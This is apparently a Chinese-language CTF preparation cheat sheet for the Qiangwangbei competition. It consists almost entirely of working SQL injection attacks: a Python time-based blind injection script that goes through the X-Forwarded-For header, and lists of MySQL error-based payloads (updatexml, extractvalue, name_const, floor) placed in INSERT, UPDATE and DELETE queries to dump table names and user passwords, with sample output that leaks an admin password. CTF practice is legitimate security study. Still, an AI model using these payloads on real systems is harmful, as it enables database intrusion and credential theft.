# for-qiangwangbei
2018/3/23-for qiangwwangbei
一、盲注脚本
  1、sleep盲注
#coding:utf-8
import requests;
maystr="0987654321qwertyuiopasdfghjklzxcvbnm."
flag=''
for j in range(33):

    for i in maystr:
        url=""
        header={
            # "X-Forwarded-For":"' +(select case when (substring((select database())from %s for 1)='%s') then sleep(5) else 0 end) and 'Zkkp'='Zkkp" % (j,i)  #跑数据库的名字
            #"X-Forwarded-For":"' +(select case when (substring((select(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))) from %s for 1)='%s') then sleep(5) else 0 end) and 'Zkkp'='Zkkp" % (j,i)  #跑表明
            #"X-Forwarded-For":"' +(select case when (substring((select(select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666C6167))) from %s for 1)='%s') then sleep(5) else 0 end) and 'Zkkp'='Zkkp" % (j,i) #跑字段名
            "X-Forwarded-For":"' +(select case when (substring((select flag from flag) from %s for 1)='%s') then sleep(5) else 0 end) and 'Zkkp'='Zkkp" % (j,i)  #跑记录
        }
        try:

            res=requests.get(url, headers=header,timeout=5).text
        except:

             flag+=i
             print flag
        # print res
  2、三种报错注入
    报错注入：
1、使用updatexml()函数  // xpath injection

　　1. 注入

　　a. 载荷格式 ：or updatexml(1,concat(0x7e,(version())),0) or

　　b. insert注入：INSERT INTO users (id, username, password) VALUES (2,‘Pseudo_Z‘ or updatexml(1,concat(0x7e,(version())),0) or‘‘, ‘security-eng‘);

　　c. update注入：UPDATE users SET password=‘security-eng‘ or updatexml(2,concat(0x7e,(version())),0) or‘‘ WHERE id=2 and username=‘Pseudo_Z‘;

　　d. delete注入：DELETE FROM users WHERE id=2 or updatexml(1,concat(0x7e,(version())),0) or‘‘;

　　2. 提取数据

　　a. 载荷格式：

　　or updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1)),0) or

　　b. insert提取表名：　　

INSERT INTO users (id, username, password) VALUES (2,‘r00tgrok‘ or updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1)),0) or ‘‘, ‘ohmygod_is_r00tgrok‘);

c. insert提取列名

INSERT INTO users (id, username, password) VALUES (2,‘r00tgrok‘ or updatexml(0,concat(0x7e,(SELECT concat(column_name) FROM information_schema.columns WHERE table_name=‘users‘ limit 0,1)),0) or ‘‘, ‘ohmygod_is_r00tgrok‘);

 

　　d. insert进行dump

INSERT INTO users (id, username, password) VALUES (2,‘r00tgrok‘ or updatexml(0,concat(0x7e,(SELECT concat_ws(‘:‘,id, username, password) FROM users limit 0,1)),0) or ‘‘, ‘ohmygod_is_r00tgrok‘);

e. delete进行dump

　　DELETE FROM users WHERE id=1 or updatexml(0,concat(0x7e,(SELECT concat_ws(‘:‘,id, username, password) FROM users limit 0,1)),0) or ‘‘;

　　f.update进行dump ? 

　　同一个表不能用update进行dump，不同的表却可以

　　UPDATE students SET name=‘Nicky‘ or Updatexml(1,concat(0x7e,(SELECT concat_ws(‘:‘,id, username, password) FROM newdb.users limit 0,1)),0) or‘‘ 　　WHERE id=1;



2、 使用extractvalue()函数

　　a. 载荷格式：or extractvalue(1,concat(0x7e,database())) or

　　b. 注入：

　　　INSERT INTO users (id, username, password) VALUES (2,‘r00tgrok‘ or extractvalue(1,concat(0x7e,database())) or‘‘, ‘Pseudo_Z‘);

　　  UPDATE users SET password=‘Nicky‘ or extractvalue(1,concat(0x7e,database())) or‘‘ WHERE id=2 and username=‘Pseudo_Z‘;

　　  DELETE FROM users WHERE id=1 or extractvalue(1,concat(0x7e,database())) or‘‘; 

 

　　c.提取数据　

INSERT INTO users (id, username, password) VALUES (2,‘r00tgrok‘ or extractvalue(1,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1))) or‘‘, ‘balabala‘);

　　dump操作及update、delete方法同上updatexml()

 

0x4 使用name_const() //5.0.13中引入，返回任何给定的值

　　a. 载荷格式： or (SELECT*FROM(SELECT(name_const(version(),1)),name_const(version(),1))a) or

　　b. 注入：　　

UPDATE users SET password=‘Nicky‘ or (SELECT*FROM(SELECT(name_const(version(),1)),name_const(version(),1))a) or ‘‘ WHERE 
id=2 and username=‘Pseudo_Z‘;

c. 提取数据

INSERT INTO users (id, username, password) VALUES (1,‘admin‘ or (SELECT*FROM(SELECT name_const((SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit 0,1),1),name_const(( SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit 0,1),1))a) or ‘‘, ‘oyyoug0d‘);



4、通过floor报错
可以通过如下一些利用代码
and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);
and (select count(*) from (select 1 union select null union select !1)x group by concat((select table_name from information_schema.tables limit 1),floor(rand(0)*2)));
举例如下：
首先进行正常查询：
mysql> select * from article where id = 1;
+----+-------+---------+
| id | title | content |
+----+-------+---------+
| 1 | test | do it |
+----+-------+---------+
假如id输入存在注入的话，可以通过如下语句进行报错。
mysql> select * from article where id = 1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);
ERROR 1062 (23000): Duplicate entry '5.1.33-community-log1' for key 'group_key'
可以看到成功爆出了Mysql的版本，如果需要查询其他数据，可以通过修改version()所在位置语句进行查询。
例如我们需要查询管理员用户名和密码：
Method1:
mysql> select * from article where id = 1 and (select 1 from (select count(*),concat((select pass from admin where id =1),floor(rand(0)*2))x from information_schema.tables group by x)a);
ERROR 1062 (23000): Duplicate entry 'admin8881' for key 'group_key'
Method2:
mysql> select * from article where id = 1 and (select count(*) from (select 1 union select null union select !1)x group by concat((select pass from admin limit 1),floor(rand(0)*2)));
ERROR 1062 (23000): Duplicate entry 'admin8881' for key 'group_key'
